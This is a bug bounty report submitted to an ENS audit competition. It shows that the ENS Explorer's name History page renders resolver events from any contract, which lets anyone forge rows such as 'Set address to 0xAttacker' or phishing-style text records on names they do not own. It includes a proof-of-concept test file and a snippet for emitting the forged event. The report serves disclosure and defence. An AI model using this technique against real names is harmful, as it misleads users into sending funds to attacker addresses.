# 93001 w a high any contract can write persistent fabricated rows including a forged set address to 0xattacker into any ens name s history page the v1 history query has no resolver provenan&#x20;

**Submitted on Sep 13th 2026 at 19:04:01 UTC by @Tradi3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93001
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

Anyone can write fabricated entries into **any** ENS name's History page on the Explorer — including a row reading "Set address to `0xAttacker`" and rows carrying arbitrary text — by emitting a resolver-shaped event from a contract they control. The victim takes no action, and the attacker needs no relationship to the name.

The History page asks the indexer for every resolver that has events *mentioning* this name, and renders all of them as that name's own history. It never checks that the name ever pointed at those resolvers. The link that would prove it is fetched in the same query and discarded.

## The query has no provenance check

`apps/portal/src/features/history/v1/fetchV1NameHistory.ts:101`:

```graphql
        resolvers(where: { domain: $id }, first: $resolvers) {
          events(first: $first, orderBy: blockNumber, orderDirection: $orderDirection) {
```

Every Resolver row whose `domain` is this name, and all of its events. The forward link is selected twenty lines earlier, at `:80`:

```graphql
            ... on NewResolver { resolverId }
```

and nothing in the module ever compares a resolver event's `resolverId` against it. The data needed to filter out resolvers the name never used is fetched and thrown away.

## Why the indexer creates that row for an arbitrary contract

The Sepolia v1 endpoint is `https://v1-graphql.ens.dev/subgraph` (ensjs `clients/l1.ts:237-241`) — an ENSNode instance. Two facts from ENSNode's own published source settle it.

**It indexes resolver events from any address.** `packages/datasources/src/sepolia.ts`:

```ts
      Resolver: {
        abi: ResolverABI,
        startBlock: 3702721, // ignores any Resolver events prior to `startBlock` of RegistryOld on Sepolia
      },
```

Every other contract in that same file carries a hardcoded `address` — `Registry`, `BaseRegistrar`, `NameWrapper`, `UniversalResolver`, `BasenamesL1Resolver`, `LineanamesL1Resolver`. The `Resolver` entry has none, so the event signatures are indexed from **any contract on the chain**.

**The row is keyed on the event's own arguments, and the project says why.** `apps/ensindexer/src/plugins/subgraph/shared-handlers/Resolver.ts`:

```
 * NOTE: The indexing logic in this file must use upserts because a 'Resolver' can be _any_
 * contract that emits events with the relevant signatures. The contract may not necessarily be
 * intended for use with ENS as a Resolver. Each indexed event could be the first one indexed for
 * a contract and its Resolver ID, so we cannot assume the Resolver entity already exists.
```

```ts
  const id = makeResolverId(context.chain.id, event.log.address, node);
  await upsertResolver(context, {
    id,
    domainId: node,
    address: event.log.address,
    addrId: address,
  });
```

`domainId` is taken directly from `event.args.node` — a value the emitting contract chooses freely. So `AddrChanged(namehash("victim.eth"), attacker)` emitted from any contract creates a Resolver row whose `domain` is `victim.eth`.

The indexer is behaving correctly here: it is faithfully recording that some contract emitted that event. The defect is that the Explorer treats "a contract mentioned this name" as "this name's history".

## The module states the intent, and the query does not implement it

`fetchV1NameHistory.ts:40-45` explains the design choice in the authors' own words:

```
 * Resolver events are read from every resolver the name has ever pointed at
 * (`resolvers(where: { domain })`), not just `domain.resolver`: that field is
 * only the *current* one, so records set on a resolver the name has since
 * moved off would silently drop out of what reads as a complete history. Each
 * event names its own resolver via `resolverId`, so the flat list stays
 * unambiguous.
```

The stated intent is exactly right: *every resolver the name has ever pointed at*. The query written underneath it means something strictly weaker — every resolver row whose `domain` field is this name, which is every contract that has ever **mentioned** the name. "Pointed at" is a claim about the registry; "mentioned" is a claim about whoever emitted the log. The gap between those two sentences is the whole bug.

The final sentence names the safeguard that was believed to be sufficient: `resolverId` makes the list "unambiguous". It does identify *which contract* emitted each event — and that is precisely why the forged row is attributed to the attacker's contract. What it cannot do, and what nothing else does, is say whether the name ever used that contract.

## Ten event types are forgeable, not one

`fetchV1NameHistory.ts:101-118` selects the full resolver event union, and each arm is rendered with its own label by `summarize/descriptors.ts`:

```graphql
            ... on AddrChanged { addr { id } }
            ... on MulticoinAddrChanged { coinType multiaddr: addr }
            ... on NameChanged { name }
            ... on AbiChanged { contentType }
            ... on PubkeyChanged { x y }
            ... on TextChanged { key value }
            ... on ContenthashChanged { hash }
            ... on InterfaceChanged { interfaceID implementer }
            ... on AuthorisationChanged { owner target isAuthorized }
            ... on VersionChanged { version }
```

Every one of these carries arguments the emitting contract chooses. The ones that render as a plain-language claim about the victim's name are:

| event                                 | rendered label                                | attacker-chosen content                        |
| ------------------------------------- | --------------------------------------------- | ---------------------------------------------- |
| `AddrChanged`, `MulticoinAddrChanged` | **"Set address to"** (`descriptors.ts:66,73`) | the address, as a clickable `/addr/$addr` chip |
| `TextChanged`                         | **"Set text record"** (`:92`)                 | both the key and the value, free strings       |
| `ContenthashChanged`                  | **"Set content hash"** (`:105`)               | the content hash                               |
| `NameChanged`                         | **"Set primary name"** (`:122,130`)           | the name string                                |

So the fabricated entry is not limited to an address. An attacker can write **"Set primary name …"** and **"Set content hash …"** rows onto someone else's name as well, each dated, each attributed to a contract and a transaction, and each interleaved with the name's genuine history.

## This is not theoretical, and it is directly checkable

The two ENSNode facts above are not a latent possibility — they are the documented indexing behaviour of the service the Explorer reads. Anyone can inspect the `Resolver` collection directly with one read query (no writes) against the same endpoint the Explorer uses (`client.chain.subgraphs.ens.url`):

```graphql
{ resolvers(first: 200) { id address domain { id name } } }
```

Each returned row is a `(contract address, node)` pair that some contract created simply by emitting a resolver-shaped event — which, per the handler above, is all it takes. That is the point: an attacker needs no weakness in the indexer and no relationship to the name. They need only emit the same kind of event with `node = namehash(victim.eth)` — a free choice in the event they emit.

To be precise about what I am and am not claiming: I am demonstrating the **mechanism** — that an arbitrary contract can produce a `Resolver` row against a node of its own choosing, which `resolvers(where: { domain: $id })` then returns as that name's history. I am not claiming that any specific registered name has already been targeted this way.

## The viewed name is stamped on unconditionally

`apps/portal/src/features/history/v1/adaptV1Events.ts:245-246`, in the module's own words:

```ts
  /** The name being viewed; v1 events carry no name of their own. */
  readonly name: string
```

and `:266`:

```ts
        name,
```

Every adapted event inherits the name of the page it is displayed on. The attacker's event becomes the victim's event.

`:260` then takes the emitting contract from the event itself:

```ts
      const resolver = resolverAddress(str(event.resolverId))
```

so the row is even attributed to the attacker's contract and links to the attacker's transaction.

## What gets rendered

`features/history/summarize/descriptors.ts:73-79` renders `AddrChanged` as **"Set address to"** followed by an address chip, and `:92` renders `TextChanged` as **"Set text record"** with the attacker's key and value as free text. `components/ActionSummaryRow.tsx:48-49` shows the label and chips with no emitting-contract column on the summary row, so nothing on the row distinguishes a forged entry from a real one.

`components/ActionSlots.tsx:53-57` renders the address as a clickable `/addr/$addr` chip.

## Impact

An attacker deploys one contract and emits whichever events they like, naming any node. The result, on ENS's own Explorer, on a page the victim does not control:

* a dated entry reading **"Set address to 0xAttacker"** on the victim's name, with a working link to the attacker's address page and the attacker's transaction hash;
* arbitrary attacker-authored text via `TextChanged` (both key and value are free strings);
* the ability to interleave these with the name's genuine history so they read as part of one record.

The History page exists so people can audit what has happened to a name. Anyone using it for that — before buying a name, before trusting one, or when investigating a dispute — is reading attacker-authored rows presented as ENS's own record. Because the entries persist in the indexer, they stay there for every future visitor.

## Why this reaches the Critical row

The Critical impact I have selected reads:

> "Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address"

That second clause is this bug verbatim, and the PoC asserts the **end state**, not the defect.

The test named `THE END STATE: the app renders "Set address to <attacker>" on victim.eth` runs the real `adaptV1Events` **and** the real `summarizeEvents` — the two functions the History tab actually calls — over a single forged event, and prints what the page renders for a name the attacker does not own:

```
[END STATE] victim.eth history renders "Set address to 0x1c7d4b196cb0c7b01d743fbc6116a902379c7238"
```

It asserts `action.label === 'Set address to'` and that the attacker's address is present in the rendered slots. `components/ActionSlots.tsx:53-57` turns that slot into a clickable `/addr/$addr` chip. `components/ActionSummaryRow.tsx:48-49` renders no emitting-contract column, so nothing on the row separates it from a genuine one.

The application renders an ENS name to an attacker-controlled address. That is the impact row.

Three points I would rather state than have triage infer:

1. **The row is about what the application displays, not about on-chain state.** It says "display or pre-fill an incorrect address … so that a user sends funds to an unintended recipient", and gives "rendering an ENS name to an attacker-controlled address" as the example. It does not require the victim's resolver or registry record to change, and nothing here touches them.
2. **The reader is doing exactly what the page is for.** The History tab is where a person checks who has controlled a name and what it has pointed at — before buying it, before trusting it, before paying it. A dated "Set address to 0xAttacker" row, carrying the attacker's own transaction hash and a working link to the attacker's address page, is the strongest evidence that surface can give a reader that this name belongs to that address. The attacker can also interleave forged rows with the genuine ones so they read as one continuous record.
3. **It is persistent, unauthenticated, and the victim cannot undo it.** The row lives in the indexer, not in the reader's browser. One transaction from one attacker-deployed contract writes it once, for every future visitor, on a page the name's owner does not control. The victim takes no action at any point.

The second impact row I selected — persistent static-content injection without JavaScript — is proven independently by the test named `TextChanged forges arbitrary attacker-authored KEY and VALUE text`. Both the record key and its value are free strings chosen by the attacker and rendered on the victim's page:

```
[text] key="url" value="https://ens-support-verify.example/claim"
```

Either row stands on its own. The address-rendering row is the one that matches the primary consequence, which is why this is filed as Critical.

**Boundary, stated explicitly.** This does not change the name's on-chain resolution, records, or ownership, and the name's profile tab still shows the true current address. The attack is on what ENS's own Explorer tells a user about a name. That is precisely what the selected impact row covers, and it is the closest row in the list — there is no separate "false history" row that would fit better.

## Why this is not an already-known issue

**Not in the published known issues.** No entry covers the name History timeline or event provenance. The only "history" entries are R3-05, R3-06 and R3-07, which are all about the transaction manager's local archive (clearing it, dropping chainId, reusing ids) — a different feature, local to the user's browser.

**Not a normalization issue.** No name is parsed and no homoglyph is involved; the attacker uses the victim's genuine namehash.

**Not an indexer bug to be dismissed as out of scope.** The indexer is doing what it documents. The defect is in `apps/portal`: it asks a question ("which resolvers mention this name") whose answer it treats as a different, stronger claim ("which resolvers this name used").

**Not my earlier resolver-badge report (#92648), and not the same family.** That report was about the Explorer reading a **storage word on a resolver contract** to certify it as "official, audited and considered secure", with the same forgeable bit standing in for the record-edit ownership check. Its data source is contract storage, its surface is the resolver badge and the edit gate, and its root cause is trusting a self-reported on-chain flag.

This report shares none of those. The data source is the **v1 history GraphQL query** against the indexer; the surface is the **History timeline**; the root cause is a query whose `where` clause answers a weaker question (`resolvers(where: { domain })` = "mentioned this name") than the module's own comment claims it answers ("every resolver the name has ever pointed at"). No resolver is certified, no badge is shown, no storage word is read, and the end state is a dated row rendering an attacker-chosen address as this name's address. Fixing #92648 — validating the audited flag — changes nothing here; fixing this one is a provenance filter on a GraphQL result set.

It is likewise distinct from #92635 (forward resolution offering "Set primary name" from an attacker-controlled record), which concerns current resolution rather than historical record.

## The app already contains the correct pattern

The address-scoped history reads a domain's **own** resolver relation rather than searching by mention — `apps/portal/src/features/address/hooks/useV1HistoryForAddress.ts:199`:

```ts
      domain.resolver?.events || []
```

ensjs's canonical `getNameHistory` does the same. `fetchV1NameHistory` is the one reader that searches by mention.

## Recommended fix

Filter resolver events by provenance before rendering them:

* collect the `resolverId` values from the name's own `NewResolver` events — already fetched at `fetchV1NameHistory.ts:80` — and keep only resolver rows whose address appears in that set; or
* follow the sibling reader and take `domain.resolver?.events`, accepting that this shows only the current resolver's events; or
* if events from historical resolvers must be shown, display the emitting contract on the summary row and mark any resolver the name never pointed at as unverified, so a reader can tell the two apart.

## Proof of Concept

## What this proves

The test drives the REAL `adaptV1Events` **and** the REAL `summarizeEvents` — the two functions the History tab calls to turn an indexer row into a rendered row — with the exact row shape ENSNode stores for a resolver event emitted by an arbitrary contract. It also asserts against the repository's own source that the query performs no provenance check.

Eight assertions. The third is the impact row's end state; the rest are the mechanism, the breadth, and a control.

1. **the forgery** — a forged `AddrChanged` naming `victim.eth` is adapted into victim.eth's timeline, stamped with the victim's name and namehash, linked to the attacker's transaction and credited to the attacker's contract;
2. **the payload** — the attacker-chosen address survives into the adapted event's data;
3. **THE END STATE** — running the production renderer over that event, victim.eth's History page shows `label === 'Set address to'` with the attacker's address in the rendered slot that `ActionSlots.tsx:53-57` turns into a clickable `/addr/$addr` chip. This is "rendering an ENS name to an attacker-controlled address", asserted on the rendered output rather than inferred from the adapter;
4. **arbitrary attacker-authored text** — a forged `TextChanged` puts an attacker-chosen **key** and **value** (both free strings) onto the victim's page, through the same real adapter and renderer;
5. **breadth** — all ten resolver event types in the query's selection set (`AddrChanged`, `MulticoinAddrChanged`, `NameChanged`, `AbiChanged`, `PubkeyChanged`, `TextChanged`, `ContenthashChanged`, `InterfaceChanged`, `AuthorisationChanged`, `VersionChanged`) come from the same unfiltered `resolvers(where: { domain: $id })` rows, so every one of them is forgeable the same way;
6. **no provenance check** — `fetchV1NameHistory.ts` contains `resolvers(where: { domain: $id }` and `... on NewResolver { resolverId }`, and never compares the two;
7. **the correct pattern exists** — the sibling `useV1HistoryForAddress.ts` uses `domain.resolver`, walking the name's own resolver relation;
8. **control** — registry-typed events are pinned to the registry address, so those rows cannot be forged this way; it is specifically the resolver-sourced rows that carry no provenance.

## Environment

Frozen revision under test: 1c9b47f. Nothing is deployed, no contract is deployed and no live service is contacted — the test calls the production adapter and renderer directly with the indexer row shape. It needs no fixtures, no network and no chain; the only files it reads are files already in the repository.

```
pnpm install
```

Save the file below as:

```
apps/portal/src/features/history/poc-v1-history-forged-provenance.test.ts
```

Run it:

```
cd apps/portal
pnpm vitest run src/features/history/poc-v1-history-forged-provenance.test.ts
```

## Result

```
RUN  v4.1.5 .../apps/portal

  [forged]  attacker event adapted as victim.eth history, tx + contract are the attacker's
  [payload] "Set address to 0x1c7d4b19..." is attacker-chosen
  [END STATE] victim.eth history renders "Set address to 0x1c7d4b196cb0c7b01d743fbc6116a902379c7238" - an attacker-controlled address displayed as this name's address
  [text]    victim.eth history renders attacker text - key="url" value="https://ens-support-verify.example/claim"
  [union]   10 resolver event types selected from the same unfiltered resolvers(where:{domain}) rows
  [query]   resolvers(where:{domain}) - the NewResolver link is fetched and discarded
  [sibling] useV1HistoryForAddress uses domain.resolver?.events - provenance intact
  [control] registry-typed events are pinned to the registry contract

 Test Files  1 passed (1)
      Tests  8 passed (8)
```

(The portal vitest setup also emits unrelated Reown/appkit `core` JSON log lines and network warnings on startup, which are harmless and unrelated to the test.)

## End-to-end reproduction (not run here — it would require deploying a contract on the live testnet, which the programme's terms do not permit)

1. Deploy any contract that emits the standard resolver event, with values you choose:

   ```
   event AddrChanged(bytes32 indexed node, address a);
   // emit AddrChanged(namehash("victim.eth"), 0xATTACKER);
   ```

   No registration, no name, and no relationship to victim.eth is required, and the contract does not need to be a resolver or be set as anyone's resolver. `TextChanged(bytes32,string,string)` gives arbitrary key/value text instead of an address.
2. ENSNode indexes it — its `Resolver` datasource has no address filter (`packages/datasources/src/sepolia.ts`) — and upserts a Resolver row with `domainId` taken from your `node` argument (`shared-handlers/Resolver.ts`).
3. Open `https://<explorer>/victim.eth/history`. The forged entry appears in the timeline, dated, linked to your transaction, reading "Set address to 0xATTACKER".

Steps 1 and 2 are the only part not executed locally. Step 3 — what the page renders once such a row exists — is exactly what assertion 3 executes, against the production renderer.

## Verifying the call sites

```
grep -n "resolvers(where" apps/portal/src/features/history/v1/fetchV1NameHistory.ts
grep -n "on NewResolver" apps/portal/src/features/history/v1/fetchV1NameHistory.ts
grep -n "The name being viewed" -A 2 apps/portal/src/features/history/v1/adaptV1Events.ts
grep -n "resolverAddress(str(event.resolverId))" -A 12 apps/portal/src/features/history/v1/adaptV1Events.ts
grep -n "Set address to" -B 4 -A 4 apps/portal/src/features/history/summarize/descriptors.ts
grep -n "addressSlot" -B 4 -A 8 apps/portal/src/features/history/components/ActionSlots.tsx
grep -n "domain.resolver" apps/portal/src/features/address/hooks/useV1HistoryForAddress.ts
```

The last command shows the sibling reader doing it correctly.

## The indexer facts, for verification

Both are in ENSNode's public repository (namehash/ensnode), which is what `https://v1-graphql.ens.dev/subgraph` runs:

* `packages/datasources/src/sepolia.ts` — the `Resolver` entry has `abi` and `startBlock` but **no `address`**, unlike every other contract in the file.
* `apps/ensindexer/src/plugins/subgraph/shared-handlers/Resolver.ts` — the file header states: "The indexing logic in this file must use upserts because a 'Resolver' can be *any* contract that emits events with the relevant signatures. The contract may not necessarily be intended for use with ENS as a Resolver." and `handleAddrChanged` writes `domainId: node` straight from the event arguments.

## Full test file

/\*\*

* PoC — anyone can write fabricated entries into any ENS name's History page on
* the Explorer, including an "address changed to " row, by emitting a
* resolver-shaped event from a contract they control.
*
* THE QUERY HAS NO PROVENANCE FILTER.
* `features/history/v1/fetchV1NameHistory.ts:101`:
*
* ```
  resolvers(where: { domain: $id }, first: $resolvers) {
  ```
* ```
    events(first: $first, orderBy: blockNumber, orderDirection: $orderDirection) {
  ```
*
* It asks the indexer for every Resolver row whose `domain` is this name, and
* takes all of their events. It never checks that the name ever pointed at that
* resolver. The forward link that WOULD prove it is fetched and thrown away —
* `fetchV1NameHistory.ts:80` selects `... on NewResolver { resolverId }`, and
* nothing ever compares a resolver event's `resolverId` against it.
*
* WHY THE INDEXER HAPPILY CREATES THAT ROW. The Sepolia v1 endpoint is
* `https://v1-graphql.ens.dev/subgraph` (ensjs `clients/l1.ts:237-241`), an
* ENSNode instance. Two facts from ENSNode's own published source:
*
* 1. The `Resolver` datasource has NO address filter, unlike every other
* contract in the same file —
* `packages/datasources/src/sepolia.ts`:
*
* ```
     Resolver: {
  ```
* ```
       abi: ResolverABI,
  ```
* ```
       startBlock: 3702721,
  ```
* ```
     },
  ```
*
* (Registry, BaseRegistrar, NameWrapper, UniversalResolver etc. each carry a
* hardcoded `address`.) So resolver-shaped events are indexed from ANY
* address on the chain.
*
* 2. The row is keyed on the event's own arguments, and the project documents
* exactly why — `apps/ensindexer/src/plugins/subgraph/shared-handlers/Resolver.ts`:
*
* ```
     NOTE: The indexing logic in this file must use upserts because a
  ```
* ```
     'Resolver' can be _any_ contract that emits events with the relevant
  ```
* ```
     signatures. The contract may not necessarily be intended for use with
  ```
* ```
     ENS as a Resolver.
  ```
*
* ```
     const id = makeResolverId(context.chain.id, event.log.address, node);
  ```
* ```
     await upsertResolver(context, { id, domainId: node, ... });
  ```
*
* `domainId` comes straight from `event.args.node` — a value the emitting
* contract chooses.
*
* So `AddrChanged(namehash("victim.eth"), attacker)` emitted from any contract
* creates a Resolver row whose `domain` is victim.eth, and the Explorer then
* renders its events as victim.eth's own history.
*
* THE VIEWED NAME IS STAMPED ON UNCONDITIONALLY —
* `features/history/v1/adaptV1Events.ts:245-246` says so in its own comment:
*
* ```
  /** The name being viewed; v1 events carry no name of their own. *\/
  ```
* ```
  readonly name: string
  ```
*
* This test drives the REAL `adaptV1Events` with the row shape the indexer
* produces for such an event. \*/ import { describe, expect, it } from 'vitest' import { readFileSync } from 'node:fs' import { join } from 'node:path' import { type Address, type Hex, namehash } from 'viem' import { adaptV1Events } from './v1/adaptV1Events' import { summarizeEvents } from './summarize/summarizeEvents'

// happy-dom swallows console.log under vitest; write to stdout directly. const log = (m: string) => process.stdout.write(m + String.fromCharCode(10))

const REPO = join(\_\_dirname, '..', '..', '..', '..', '..') const read = (rel: string) => readFileSync(join(REPO, rel), 'utf8')

const VICTIM = 'victim.eth' const VICTIM\_NODE = namehash(VICTIM) as Hex /\*\* The attacker's own contract — never set as victim.eth's resolver. */ const EVIL\_CONTRACT = '0x5fa3a46a6b7f4e374e9671b9dd946d80958c9e47' /*\* The address the attacker wants shown as victim.eth's new address. \*/ const ATTACKER\_ADDR = '0x1c7d4b196cb0c7b01d743fbc6116a902379c7238'

const CONTRACTS = { registry: '0x0000000000000000000000000000000000000001' as Address, nameWrapper: '0x0000000000000000000000000000000000000002' as Address, baseRegistrar: '0x0000000000000000000000000000000000000003' as Address, }

/\*\*

* What the indexer stores for `AddrChanged(node=victim.eth, a=attacker)` emitted
* by EVIL\_CONTRACT. The resolver id is ENSNode's `{chainId}-{address}-{node}`. \*/ const forgedEvent = { id: 'forged-1', blockNumber: 9\_000\_000, transactionID: '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', type: 'AddrChanged', resolverId: `11155111-${EVIL_CONTRACT}-${VICTIM_NODE}`, addr: { id: ATTACKER\_ADDR }, } as unknown as Parameters\[0]\['events']\[number]

const blockTimestamps = new Map(\[\[9\_000\_000n, 1\_760\_000\_000n]])

describe('v1 history renders any contract’s events as the viewed name’s own', () => { it('a forged AddrChanged is adapted into victim.eth’s timeline', () => { const \[adapted] = adaptV1Events({ events: \[forgedEvent], name: VICTIM, namehash: VICTIM\_NODE, blockTimestamps, contracts: CONTRACTS, })

```
expect(adapted).toBeDefined()
// The viewed name is stamped onto the attacker's event.
expect(adapted.name).toBe(VICTIM)
expect(adapted.namehash).toBe(VICTIM_NODE)

// The attacker's transaction is what the row links to.
expect(adapted.transactionHash).toBe(forgedEvent.transactionID)

// And the attacker's contract is credited as the emitting resolver.
expect(String(adapted.contractAddress).toLowerCase()).toBe(EVIL_CONTRACT)

log('  [forged]  attacker event adapted as victim.eth history, tx + contract are the attacker’s')
```

})

it('the attacker-chosen address survives into the rendered payload', () => { const \[adapted] = adaptV1Events({ events: \[forgedEvent], name: VICTIM, namehash: VICTIM\_NODE, blockTimestamps, contracts: CONTRACTS, })

```
// The address the UI will show as "Set address to".
const blob = JSON.stringify(adapted.data ?? {}).toLowerCase()
expect(blob).toContain(ATTACKER_ADDR)

log('  [payload] "Set address to ' + ATTACKER_ADDR.slice(0, 10) + '…" is attacker-chosen')
```

})

it('THE END STATE: the app renders "Set address to " on victim.eth', () => { // Everything above shows the forged row entering the timeline. This drives // the REAL renderer the History page uses — summarizeEvents -> DESCRIPTORS // -> addressSlot — and asserts what a visitor actually sees on the page. // // This is the impact row verbatim: "Causing the application to display or // pre-fill an incorrect address, name, or transaction detail ... such as: // resolving or rendering an ENS name to an attacker-controlled address". const \[adapted] = adaptV1Events({ events: \[forgedEvent], name: VICTIM, namehash: VICTIM\_NODE, blockTimestamps, contracts: CONTRACTS, })

```
const [action] = summarizeEvents([adapted])

// The label the row displays, straight from the production descriptor table.
expect(action).toBeDefined()
expect(action.label).toBe('Set address to')

// The address the row displays, in the production slot the UI renders as a
// clickable /addr/$addr chip — the ATTACKER's, on the VICTIM's page.
const slots = JSON.stringify(action.slots ?? []).toLowerCase()
expect(slots).toContain(ATTACKER_ADDR)

log(
  '  [END STATE] victim.eth history renders "' +
    action.label +
    ' ' +
    ATTACKER_ADDR +
    '" - an attacker-controlled address displayed as this name’s address',
)
```

})

it('TextChanged forges arbitrary attacker-authored KEY and VALUE text', () => { // The report claims TextChanged lets an attacker put free-form text on the // victim's page (both key and value). Proving it, through the same real // adapter + renderer, rather than asserting it. const EVIL\_KEY = 'url' const EVIL\_VALUE = '<https://ens-support-verify.example/claim>'

```
const forgedText = {
  id: 'forged-text-1',
  blockNumber: 9_000_000,
  transactionID:
    '0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc',
  type: 'TextChanged',
  resolverId: `11155111-${EVIL_CONTRACT}-${VICTIM_NODE}`,
  key: EVIL_KEY,
  value: EVIL_VALUE,
} as unknown as Parameters<typeof adaptV1Events>[0]['events'][number]

const [adapted] = adaptV1Events({
  events: [forgedText],
  name: VICTIM,
  namehash: VICTIM_NODE,
  blockTimestamps,
  contracts: CONTRACTS,
})

// Stamped onto the victim's name, same as the address case.
expect(adapted.name).toBe(VICTIM)

const [action] = summarizeEvents([adapted])
const rendered = JSON.stringify(action).toLowerCase()

// Both halves are attacker-chosen and both reach the rendered row.
expect(rendered).toContain(EVIL_KEY)
expect(rendered).toContain(EVIL_VALUE.toLowerCase())

log(
  '  [text]    victim.eth history renders attacker text — key="' +
    EVIL_KEY +
    '" value="' +
    EVIL_VALUE +
    '"',
)
```

})

it('the resolver-event union the query selects is what makes many types forgeable', () => { // The report claims ten resolver event types are selectable and forgeable. // Rather than assert that, pin it to the query's own selection set. const q = read('apps/portal/src/features/history/v1/fetchV1NameHistory.ts')

```
const union = [
  'AddrChanged',
  'MulticoinAddrChanged',
  'NameChanged',
  'AbiChanged',
  'PubkeyChanged',
  'TextChanged',
  'ContenthashChanged',
  'InterfaceChanged',
  'AuthorisationChanged',
  'VersionChanged',
]
for (const type of union) {
  expect(q).toContain(type)
}

// Every one of them is selected from the SAME unfiltered resolver rows.
expect(q).toContain('resolvers(where: { domain: $id }')

log(
  '  [union]   ' +
    union.length +
    ' resolver event types selected from the same unfiltered resolvers(where:{domain}) rows',
)
```

})

it('the query selects every resolver row for the name, with no provenance check', () => { const q = read('apps/portal/src/features/history/v1/fetchV1NameHistory.ts')

```
// Resolver events are pulled by domain alone.
expect(q).toContain('resolvers(where: { domain: $id }')
// The forward link is fetched...
expect(q).toContain('... on NewResolver { resolverId }')
// ...and never used to filter the resolver rows.
expect(q).not.toContain('resolverId ===')
expect(q).not.toContain('activeResolver')

log('  [query]   resolvers(where:{domain}) — the NewResolver link is fetched and discarded')
```

})

it('the app’s sibling reader does it correctly, so the right pattern exists', () => { // The address-scoped history walks the domain's OWN resolver relation. const sibling = read( 'apps/portal/src/features/address/hooks/useV1HistoryForAddress.ts', ) expect(sibling).toContain('domain.resolver')

```
log('  [sibling] useV1HistoryForAddress uses domain.resolver?.events — provenance intact')
```

})

it('control: a registry event is attributed to the registry, not to a caller', () => { const registryEvent = { id: 'genuine-1', blockNumber: 9\_000\_000, transactionID: '0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb', type: 'NewResolver', resolverId: `11155111-${EVIL_CONTRACT}-${VICTIM_NODE}`, } as unknown as Parameters\[0]\['events']\[number]

```
const [adapted] = adaptV1Events({
  events: [registryEvent],
  name: VICTIM,
  namehash: VICTIM_NODE,
  blockTimestamps,
  contracts: CONTRACTS,
})

// Registry-emitted types are pinned to the registry address, so those rows
// cannot be forged this way — it is specifically the resolver-sourced rows
// that carry no provenance.
expect(adapted.contractAddress).toBe(CONTRACTS.registry)

log('  [control] registry-typed events are pinned to the registry contract')
```

}) })
